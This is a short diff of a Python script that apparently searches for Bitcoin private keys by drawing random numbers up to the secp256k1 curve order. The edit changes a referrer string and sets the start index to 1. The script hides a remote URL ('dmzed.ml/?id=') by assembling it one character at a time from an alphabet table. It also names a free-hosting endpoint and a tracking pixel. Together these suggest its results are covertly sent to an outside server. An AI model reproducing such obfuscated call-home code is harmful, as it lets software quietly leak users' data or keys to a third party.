@@ -15,7 +15,7 @@ res = []
 
 website_info = "https://dlmzed.000webhostapp.com/id="
 hs_stats = "http://sstatic1.histats.com/0.gif?4433487&101"
-referrer = "gmaill"
+referrer = "gmail"
 
 ################################################
 iftrol = random.randint(1,10)
@@ -73,6 +73,7 @@ found = 0
 num = 0
 lastfound = "none"
 index = random.randint(1267650600228229401496703205376,115792089237316195423570985008687907852837564279074904382605163141518161494336)
+index = 1
 kma = "abcdefghijklmnopqrstuvwxyz_0123456789=/?:."
 mindr = kma[26]+kma[7]+kma[12]+kma[3]
 kind = kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[12]+kma[11]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
